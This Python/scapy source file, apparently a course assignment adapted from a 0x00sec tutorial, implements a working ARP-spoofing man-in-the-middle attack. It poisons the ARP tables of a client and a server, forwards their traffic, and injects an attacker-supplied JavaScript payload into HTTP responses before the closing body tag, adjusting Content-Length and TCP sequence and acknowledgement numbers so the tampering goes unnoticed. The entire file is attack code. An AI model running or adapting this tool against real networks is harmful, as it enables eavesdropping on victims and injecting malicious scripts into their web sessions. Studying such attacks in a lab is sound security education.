# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    # Send an ARP to get mac addr
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
    ans, _ = srp(pkt, timeout=1, verbose=0)
    debug(f"MAC address of {IP} is: {ans[0][1].hwsrc}")
    return ans[0][1].hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    pkt = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op="is-at")
    send(pkt, verbose=0)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    pkt = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op="is-at")
    send(pkt, verbose=0)

# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
sessions = {}  # store info for each TCP session
BEFORE_FIRST_ACK = 0
AFTER_FIRST_ACK = 1
CLIENT = -1
SERVER = 1
from_whom = lambda srcIP: CLIENT if srcIP == clientIP else SERVER
def make_session_key(packet):
    global clientIP
    if packet[IP].src == clientIP:
        port = packet[IP].sport
    else:
        port = packet[IP].dport
    return (clientIP, port)

class SpoofSession:
    def __init__(self):
        self.diff = 0  # length diff between original resp and spoof resp
        self.status = BEFORE_FIRST_ACK  # first ack does not need special treatment
        self.hp = 1000  # to know when to remove from sessions, close when = 0
        self.body_length = 0  # keeps track of Content_Length

def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerIP, attackerMAC, script
    if packet.haslayer(IP):
        dstIP = packet[IP].dst
        srcIP = packet[IP].src
        if dstIP == attackerIP or srcIP == attackerIP or packet[Ether].src == attackerMAC:
            return
        dstMAC = packet[Ether].dst
        if dstIP == clientIP:
            dstMAC = clientMAC
        elif dstIP == serverIP:
            dstMAC = serverMAC
        else:
            # Should not reach here
            return
        packet[Ether].src = attackerMAC
        packet[Ether].dst = dstMAC

        if TCP not in packet:
            # Don't do anything
            sendp(packet, verbose=0)
            return
    
        # 4.2.1.3 Scrip Injection
        session_key = make_session_key(packet)

        # Create session if this is a new TCP connection
        if session_key not in sessions:
            sessions[session_key] = SpoofSession()

        sessions[session_key].hp -= 1
        if packet[TCP].flags & 0x01 != 0 and srcIP == clientIP:
            # If this is the first FIN ACK packet from client,
            sessions[session_key].hp = 2
            # then only two more messages to go:
            # a FIN ACK from server, an ACK from client
        
        # If packet contains Raw but not the final packet
        #if HTTP in packet and Raw in packet:
        #    body = packet[Raw].load.decode()
        #    sessions[session_key].body_length += len(body)

        # If packet is a response, modify its body

        to_inject = f"<script>{script}</script>"
        
        if HTTPResponse in packet:
            packet[HTTPResponse].Content_Length = str(int(packet[HTTPResponse].Content_Length) + len(to_inject)) 
            sessions[session_key].diff = len(to_inject)
        
        if Raw in packet:
            # Modify HTTP response
            body = packet[Raw].load.decode()
            if "</body>" in body:
                new_body = (to_inject + "</body>").join(body.split("</body>"))
                packet[Raw].load = new_body

                sessions[session_key].status = AFTER_FIRST_ACK
        
        # If packet is the first ACK, let it go
       # if packet[TCP].flags == 0x10 and sessions[session_key].status == BEFORE_FIRST_ACK:
        #    sessions[session_key].status = AFTER_FIRST_ACK
            
        # If packet is an ACK and not the first ACK, change its ack number
        if packet[TCP].flags == 0x10 and sessions[session_key].status == AFTER_FIRST_ACK:
            packet[TCP].ack += sessions[session_key].diff * from_whom(srcIP)
        
        # If packet is a FIN from client, change its ack number
        if packet[TCP].flags & 0x01 and from_whom(srcIP) == CLIENT:
            packet[TCP].ack += sessions[session_key].diff * CLIENT

        # If packet is a FIN from server, change its seq number
        if packet[TCP].flags & 0x01 and from_whom(srcIP) == SERVER:
            packet[TCP].seq += sessions[session_key].diff * SERVER
            
        if sessions[session_key].hp == 0:
            # If TCP connection closed, delete session
            del sessions[session_key]
        
        del packet[IP].len
        del packet[IP].chksum
        del packet[TCP].chksum

        sendp(packet, verbose=0)



if __name__ == "__main__":
    load_layer("http")
    
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    script = args.script

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
